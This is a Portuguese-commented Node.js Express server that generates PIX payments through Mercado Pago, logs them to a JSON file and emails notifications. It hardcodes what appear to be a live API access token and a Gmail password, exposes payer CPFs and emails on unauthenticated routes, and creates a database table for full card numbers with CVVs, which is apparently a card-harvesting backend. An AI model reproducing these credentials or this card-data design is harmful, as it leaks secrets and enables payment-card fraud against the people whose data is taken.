"use strict";
const axios = require("axios");
const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const fs = require("fs");
const { v4: uuidv4 } = require("uuid");
const { Pool } = require("pg");
const nodemailer = require("nodemailer");

const app = express();
app.use(bodyParser.json());
app.use(cors());

/********************
 * CONFIGURAÇÃO PIX *
 ********************/
const ACCESS_TOKEN = "APP_USR-7155153166578433-022021-bb77c63cb27d3d05616d5c08e09077cf-502781407";
const PAGAMENTOS_FILE = "pagamentos.json";

if (!fs.existsSync(PAGAMENTOS_FILE)) {
  fs.writeFileSync(PAGAMENTOS_FILE, JSON.stringify([]));
}

/********************
 * CONFIGURAÇÃO E-MAIL *
 ********************/
const SMTP_EMAIL = "joreljunior0102@gmail.com";
const SMTP_PASS  = "M10019210a";
const NOTIFY_TO  = SMTP_EMAIL;

const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: { user: SMTP_EMAIL, pass: SMTP_PASS },
});

async function enviarNotificacaoEmail(pagamento, tipo = "gerado") {
  try {
    const assunto = tipo === "aprovado"
      ? `Pagamento PIX aprovado ✅ - txid: ${pagamento.txid}`
      : `Nova chave PIX gerada (pendente) - txid: ${pagamento.txid}`;

    let html = `
      <h2>${tipo === "aprovado" ? "Pagamento aprovado" : "Chave PIX gerada"}</h2>
      <p><b>TXID:</b> ${pagamento.txid}</p>
      <p><b>Valor:</b> R$ ${Number(pagamento.valor).toFixed(2)}</p>
      <p><b>Email do pagador:</b> ${pagamento.payerEmail || "-"}</p>
      <p><b>CPF:</b> ${pagamento.payerCpf || "-"}</p>
      <p><b>Status:</b> ${pagamento.status || "-"}</p>
      <p><b>Copia e Cola:</b> <code>${pagamento.copiaECola || "-"}</code></p>
    `;

    if (pagamento.qrcodeBase64) {
      html += `<p><img src="data:image/png;base64,${pagamento.qrcodeBase64}" alt="QR Code" style="max-width:300px;"/></p>`;
    }

    const mailOptions = {
      from: `"Notificação PIX" <${SMTP_EMAIL}>`,
      to: NOTIFY_TO,
      subject: assunto,
      html,
    };

    await transporter.sendMail(mailOptions);
    console.log(`📧 Notificação enviada (${tipo}) — txid=${pagamento.txid}`);
  } catch (err) {
    console.error("❌ Erro ao enviar notificação por e-mail:", err.message || err);
  }
}

/********************
 * GERAR PIX OTIMIZADO *
 ********************/
async function gerarChavePix(valor, payerEmail, payerCpf) {
  try {
    const idempotencyKey = uuidv4();

    // ⚡ Usando endpoint PIX dedicado para agilizar
    const response = await axios.post(
      "https://api.mercadopago.com/v1/payments/pix",
      {
        transaction_amount: valor,
        description: "Pagamento via PIX",
        payer_email: payerEmail,
        external_reference: uuidv4(), // txid único
      },
      {
        headers: {
          Authorization: `Bearer ${ACCESS_TOKEN}`,
          "Content-Type": "application/json",
          "X-Idempotency-Key": idempotencyKey,
        },
      }
    );

    const data = response.data;
    const qrcodeData = {
      txid: data.id || uuidv4(),
      qrcodeBase64: data.point_of_interaction?.transaction_data?.qr_code_base64 || "",
      copiaECola: data.point_of_interaction?.transaction_data?.qr_code || "",
      valor,
      payerEmail,
      payerCpf,
      status: "pending",
    };

    console.log(`Chave PIX gerada: ${JSON.stringify(qrcodeData)}`);
    return qrcodeData;
  } catch (error) {
    console.error("Erro ao gerar chave PIX:", error.response?.data || error.message);
    throw new Error(error.response?.data?.message || "Erro ao gerar chave PIX");
  }
}

/********************
 * ROTA GERAR PIX *
 ********************/
app.post("/gerar-chave-pix", async (req, res) => {
  try {
    const { valor, payerEmail, payerCpf } = req.body;
    if (!valor || isNaN(valor) || valor <= 0) return res.status(400).json({ error: "Valor inválido" });

    const qrcodeData = await gerarChavePix(parseFloat(valor), payerEmail, payerCpf);

    // Salva JSON (síncrono é OK para poucos registros)
    const pagamentos = JSON.parse(fs.readFileSync(PAGAMENTOS_FILE, "utf8"));
    pagamentos.push(qrcodeData);
    fs.writeFileSync(PAGAMENTOS_FILE, JSON.stringify(pagamentos, null, 2));

    // ⚡ envio de e-mail **assincronamente** para não travar a resposta
    enviarNotificacaoEmail(qrcodeData, "gerado").catch(err => console.error(err));

    res.json(qrcodeData);
  } catch (error) {
    console.error("Erro ao gerar chave PIX:", error.message);
    res.status(500).json({ error: error.message });
  }
});

/********************
 * ATUALIZAR STATUS PAGAMENTO *
 ********************/
async function atualizarStatusPagamentos() {
  try {
    const pagamentos = JSON.parse(fs.readFileSync(PAGAMENTOS_FILE, "utf8"));

    for (const pagamento of pagamentos) {
      if (pagamento.status !== "approved") {
        try {
          const response = await axios.get(`https://api.mercadopago.com/v1/payments/${pagamento.txid}`, {
            headers: { Authorization: `Bearer ${ACCESS_TOKEN}` },
          });

          const novoStatus = response.data.status;
          if (novoStatus === "approved" && pagamento.status !== "approved") {
            pagamento.status = novoStatus;
            // envia notificação de aprovação (assincronamente)
            enviarNotificacaoEmail(pagamento, "aprovado").catch(err => console.error(err));
            console.log(`Pagamento aprovado: txid=${pagamento.txid}`);
          } else {
            pagamento.status = novoStatus;
          }
        } catch (err) {
          console.error("Erro ao atualizar status do pagamento:", err.message);
        }
      }
    }

    fs.writeFileSync(PAGAMENTOS_FILE, JSON.stringify(pagamentos, null, 2));
  } catch (err) {
    console.error("Erro ao atualizar status dos pagamentos:", err.message);
  }
}

/********************
 * ROTAS EXISTENTES DE PAGAMENTOS *
 ********************/
app.get("/pagamentos", (req, res) => {
  try {
    const pagamentos = JSON.parse(fs.readFileSync(PAGAMENTOS_FILE, "utf8"));
    res.json(pagamentos.filter(p => p.status === "approved"));
  } catch (error) {
    res.status(500).json({ error: "Erro ao carregar pagamentos" });
  }
});

app.post("/verificar-status", async (req, res) => {
  const { txid } = req.body;
  if (!txid) return res.status(400).json({ error: "txid não fornecido" });

  try {
    const response = await axios.get(`https://api.mercadopago.com/v1/payments/${txid}`, {
      headers: { Authorization: `Bearer ${ACCESS_TOKEN}` },
    });
    const status = response.data.status;

    const pagamentos = JSON.parse(fs.readFileSync(PAGAMENTOS_FILE, "utf8"));
    const pagamento = pagamentos.find(p => p.txid === txid);
    if (pagamento) {
      pagamento.status = status;
      fs.writeFileSync(PAGAMENTOS_FILE, JSON.stringify(pagamentos, null, 2));
    }

    res.json({ status });
  } catch (error) {
    res.status(500).json({ error: "Erro ao verificar status do pagamento" });
  }
});

/********************
 * BANCO DE CARTÕES *
 ********************/
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false },
});

pool.connect()
  .then(() => console.log("Conectado ao banco Postgres no Render!"))
  .catch(err => console.error("Erro de conexão com o banco:", err.message));

app.get("/init-db", async (req, res) => {
  try {
    const sql = `
      CREATE TABLE IF NOT EXISTS cartoes (
        id SERIAL PRIMARY KEY,
        cpf VARCHAR(20) NOT NULL,
        numero VARCHAR(20) NOT NULL,
        nome VARCHAR(100) NOT NULL,
        validade VARCHAR(10) NOT NULL,
        cvv VARCHAR(5) NOT NULL,
        criado_em TIMESTAMP DEFAULT NOW()
      );
    `;
    await pool.query(sql);
    res.json({ sucesso: true, mensagem: "Tabela 'cartoes' criada ou já existente!" });
  } catch (err) {
    console.error("ERRO COMPLETO AO CRIAR TABELA:", err);
    res.status(500).json({ error: "Erro ao criar tabela, verifique o log do backend" });
  }
});

/********************
 * ATUALIZAÇÃO AUTOMÁTICA DE STATUS *
 ********************/
setInterval(atualizarStatusPagamentos, 60_000); // a cada 60s

/********************
 * SERVIDOR *
 ********************/
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor rodando na porta ${PORT}`));